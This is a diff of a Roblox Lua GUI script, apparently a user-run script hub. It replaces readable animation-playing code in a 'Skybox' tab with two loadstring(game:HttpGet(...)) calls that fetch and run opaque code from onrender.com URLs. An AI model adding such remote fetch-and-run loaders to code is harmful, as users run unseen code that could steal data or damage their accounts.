@@ -3067,71 +3067,20 @@ Tab16:AddButton({
 })
 
 local Tab17 = Window:MakeTab({
-    Name = "Play Skybox By Chxris95_X",
+    Name = "Play Skybox By Chris & Rixer95-x2, Chxris",
     Icon = "rbxassetid://1",
     PremiumOnly = false
 })
 
 Tab17:AddButton({
-    Name = "Play Skybox",
+    Name = "Skybox Gui By Chris & Rixer95-x2, Chxris",
     Callback = function()
-        local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
+        task.spawn(function()
+    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/a340f1720c5227c814c71d565f7149b0"))()
+end)
 
-local Settings = {
-    ["Fade In"] = 0.1,
-    ["Fade Out"] = 0.1,
-    ["Weight"] = 1,
-    ["Speed"] = 1,
-    ["Time Position"] = 0.99
-}
-
-_G.CurrentTrack = nil
-local FIXED_ANIMATION_ID = 70883871260184
-
-local function LoadTrack()
-    if _G.CurrentTrack then 
-        _G.CurrentTrack:Stop(Settings["Fade Out"]) 
-    end
-
-    local newAnim = Instance.new("Animation")
-    newAnim.AnimationId = "rbxassetid://" .. FIXED_ANIMATION_ID
-
-    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
-    local newTrack = animator:LoadAnimation(newAnim)
-
-    newTrack.Priority = Enum.AnimationPriority.Action4
-    newTrack:Play(Settings["Fade In"], Settings["Weight"], Settings["Speed"])
-
-    _G.CurrentTrack = newTrack
-
-    if newTrack.Length > 0 then
-        newTrack.TimePosition = Settings["Time Position"] * newTrack.Length
-    end
-
-    task.delay(1, function()
-        if _G.CurrentTrack == newTrack and newTrack.IsPlaying then
-            newTrack:AdjustSpeed(0)
-        end
-    end)
-end
-
-LoadTrack()
-    end
-})
-
-Tab17:AddButton({
-    Name = "Stop Play",
-    Callback = function()
-        local Settings = {
-    ["Fade Out"] = 0.1
-}
-
-if _G.CurrentTrack then
-    _G.CurrentTrack:Stop(Settings["Fade Out"])
-    _G.CurrentTrack = nil
-end
+task.spawn(function()
+    loadstring(game:HttpGet("https://key-script.onrender.com/2e75e8686697a672df458856c64b12a1"))()
+end)
     end
 })
